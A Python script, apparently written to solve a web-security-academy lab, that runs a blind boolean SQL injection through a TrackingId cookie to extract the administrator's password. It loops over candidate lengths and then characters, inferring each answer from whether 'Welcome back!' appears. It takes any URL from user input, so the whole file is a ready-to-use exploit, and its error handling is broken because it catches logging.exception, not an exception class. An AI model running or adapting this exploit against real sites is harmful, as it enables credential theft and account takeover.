#!/usr/bin/python
from logging import exception
import requests
import sys
import os
os.system("clear")
def main(url):
    try:
        global TrackId
        ResponseTrack=requests.get(url)
        TrackId=ResponseTrack.headers.get("Set-Cookie").split(";")[0].split("=")[1]
        global length_password
        print("---------------------start find password length--------------------------")
        for i in range(1,100):
            cookie={'TrackingId':str(TrackId)+"'+AND+(select+username+from+users+where+username='administrator'+and+LENGTH(password)="+str(i)+")='administrator'--;"}
            webpage=requests.get(url,cookies=cookie)
            if "Welcome back!" in webpage.text:
                length_password=i
        print("the length of password is :"+str(length_password))
        print("--------------------------------END--------------------------------------")
        print("---------------------start find password--------------------------")
        char="abcdefghijklmnopqrstuvwxyz0123456789"
        password=""
        for i in range(1,length_password+1):
            for j in char:  
                cookie={'TrackingId':str(TrackId)+"'AND+(select+substring(password,"+str(i)+",1)+from+users+where+username='administrator')='"+j+"'--;"}
                webpage=requests.get(url,cookies=cookie)
                if "Welcome back!" in webpage.text:
                    print(f"[{i}]===[{j}] --> Found")
                    password +=j                               
        print("the password is : "+password)
        print("-------------------------END--------------------------------------")
        print("")
    except exception:
        print("!! error check the url and try again")
        sys.exit
# Find_Password("https://0a460000042dd872c0669bcb00cb0073.web-security-academy.net")
print("""+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
         + Author : MEKUROKO007                                  +
         + github : https://github.com/MEKuroko007               +
         +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
        """)

url=input("enter the url : ")
if __name__=='__main__':
    main(url)
